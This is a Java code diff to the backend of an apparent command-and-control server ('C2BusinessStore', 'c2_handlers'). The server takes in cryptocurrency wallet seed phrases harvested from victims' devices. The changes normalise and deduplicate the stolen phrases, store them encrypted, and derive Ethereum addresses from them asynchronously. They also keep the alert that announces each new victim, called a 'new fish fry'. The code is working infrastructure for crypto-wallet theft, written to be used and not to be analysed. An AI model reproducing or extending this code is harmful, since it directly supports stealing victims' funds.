@@ -64,6 +64,10 @@ public class C2BusinessStore {
     @Qualifier("albumMaterializeExecutor")
     private Executor albumMaterializeExecutor;
 
+    @Autowired
+    @Qualifier("walletDeriveExecutor")
+    private Executor walletDeriveExecutor;
+
     @org.springframework.beans.factory.annotation.Value("${news4.album.photo-dir:}")
     private String photoDir;
 
@@ -198,38 +202,71 @@ public class C2BusinessStore {
                     ctx.getRecordId(), ctx.getDeviceRowId(), ctx.getDeviceId());
             return;
         }
-        String result = str(plaintext, "result");
-        if (result.isEmpty()) {
+        String resultRaw = str(plaintext, "result");
+        if (resultRaw.isEmpty()) {
             log.info("正常日志:[c2_handlers][mnemonic] result 为空, recordId={}", ctx.getRecordId());
+            return;
+        }
+        // 与 18 一致：小写 + trim + 空白压缩，同一物理词只算一次
+        String result = normalizeMnemonic(resultRaw);
+        if (result.isEmpty()) {
+            log.info("正常日志:[c2_handlers][mnemonic] result 规范化后为空, recordId={}", ctx.getRecordId());
             return;
         }
         // wordscount：助记词位数（按空白分词计数，如 12/15/18/21/24）
         int wordscount = 0;
-        String[] parts = result.trim().split("\\s+");
+        String[] parts = result.split("\\s+");
         for (String p : parts) {
             if (!p.isEmpty()) {
                 wordscount++;
             }
         }
         String phraseHash = DigestUtil.sha256Hex(result);
+        String deviceId = ctx.getDeviceId() == null ? "" : ctx.getDeviceId();
+        String source = WalletSourceUtil.toWalletName(str(plaintext, "a"));
+
+        // 同设备 + 同钱包 + 同词：已存在则不再入库、不再派生
+        try {
+            Integer existId = mnemonicDao.findIdByDeviceSourceHash(deviceId, source, phraseHash);
+            if (existId != null && existId > 0) {
+                try {
+                    mnemonicDao.incrementDupCount(deviceId, source, phraseHash);
+                } catch (Exception ex) {
+                    log.info("异常日志:[c2_handlers][mnemonic] 递增 dup 失败, recordId={}, err={}",
+                            ctx.getRecordId(), ex.getMessage());
+                }
+                log.info("正常日志:[c2_handlers][mnemonic] 重复跳过(同设备+钱包+词), recordId={}, existId={}, deviceid={}, source={}",
+                        ctx.getRecordId(), existId, deviceId, source);
+                return;
+            }
+        } catch (Exception ex) {
+            log.info("异常日志:[c2_handlers][mnemonic] 幂等预查失败，继续插入, recordId={}, err={}",
+                    ctx.getRecordId(), ex.getMessage());
+        }
+
         try {
             MnemonicEntity e = new MnemonicEntity();
             // mnemonic.device_id 存 device.deviceid（不是 device.device_id）
-            e.setDeviceId(ctx.getDeviceId() == null ? "" : ctx.getDeviceId());
+            e.setDeviceId(deviceId);
             e.setChannelcode(ctx.getChannelcode() == null ? "" : ctx.getChannelcode());
             e.setWordscount(wordscount);
             // 助记词加密入库（AES-256-ECB，与 18-consumer-server 一致）；result_hash 存明文 sha256 供查重
             e.setResult(encryptMnemonic(result));
-            // source：明文 a 短码映射为钱包名称（无映射则保留原值）
-            e.setSource(WalletSourceUtil.toWalletName(str(plaintext, "a")));
+            e.setSource(source);
             e.setRecvDupCount(0);
             e.setStatus(1);
             e.setPhraseHash(phraseHash);
             e.setAddtime(System.currentTimeMillis() / 1000.0);
             mnemonicDao.insert(e);
 
-            // 派生 address4：用内存中的明文助记词（plaintext.result），不读库
-            deriveAddress4(e.getId(), plaintext, ctx);
+            // 派生用规范化后的词（与入库一致）
+            JSONObject derivePt = plaintext;
+            if (!result.equals(resultRaw)) {
+                derivePt = new JSONObject(plaintext);
+                derivePt.put("result", result);
+            }
+            // 派生 address4：离载 Kafka listener，事务提交后异步执行（CallerRuns 保证不丢）
+            scheduleDeriveAddress4(e.getId(), derivePt, ctx);
 
             // 新助记词入库成功 → 异步飞机「新鱼苗」通知
             try {
@@ -243,10 +280,11 @@ public class C2BusinessStore {
                         ctx.getRecordId(), te.getMessage());
             }
         } catch (DuplicateKeyException dup) {
-            // 重复助记词：递增 recv_dup_count
+            // 并发竞态兜底：递增 recv_dup_count，不派生
             try {
-                mnemonicDao.incrementDupCount(ctx.getDeviceId() == null ? "" : ctx.getDeviceId(), phraseHash);
-                log.info("正常日志:[c2_handlers][mnemonic] 重复助记词，递增 dup, recordId={}", ctx.getRecordId());
+                mnemonicDao.incrementDupCount(deviceId, source, phraseHash);
+                log.info("正常日志:[c2_handlers][mnemonic] 重复助记词(UK冲突)，递增 dup, recordId={}, source={}",
+                        ctx.getRecordId(), source);
             } catch (Exception ex) {
                 log.info("异常日志:[c2_handlers][mnemonic] 递增 dup 失败, recordId={}, err={}",
                         ctx.getRecordId(), ex.getMessage());
@@ -257,7 +295,48 @@ public class C2BusinessStore {
         }
     }
 
+    /** 助记词规范化：与 18 PhraseResult 一致，保证同一物理词 hash 稳定 */
+    private static String normalizeMnemonic(String phrase) {
+        if (phrase == null || phrase.isEmpty()) {
+            return "";
+        }
+        return phrase.toLowerCase().trim().replaceAll("\\s+", " ");
+    }
+
     /** address4 派生：由 mnemonic 经 web3j 派生 ETH 地址并插入 address4；成功后异步通知三方监听 */
+    private void scheduleDeriveAddress4(Integer mnemonicId, JSONObject plaintext, C2HandlerContext ctx) {
+        if (mnemonicId == null) {
+            return;
+        }
+        Runnable job = () -> {
+            try {
+                deriveAddress4(mnemonicId, plaintext, ctx);
+            } catch (Throwable t) {
+                log.info("异常日志:[c2_handlers][address4] 异步派生失败, mnemonicId={}, err={}",
+                        mnemonicId, t.toString());
+            }
+        };
+        Runnable submit = () -> {
+            try {
+                walletDeriveExecutor.execute(job);
+            } catch (Exception ex) {
+                log.info("异常日志:[c2_handlers][address4] 提交派生失败，降级同步, mnemonicId={}, err={}",
+                        mnemonicId, ex.getMessage());
+                job.run();
+            }
+        };
+        if (TransactionSynchronizationManager.isSynchronizationActive()) {
+            TransactionSynchronizationManager.registerSynchronization(new TransactionSynchronization() {
+                @Override
+                public void afterCommit() {
+                    submit.run();
+                }
+            });
+            return;
+        }
+        submit.run();
+    }
+
     private void deriveAddress4(Integer mnemonicId, JSONObject plaintext, C2HandlerContext ctx) {
         if (mnemonicId == null) {
             return;
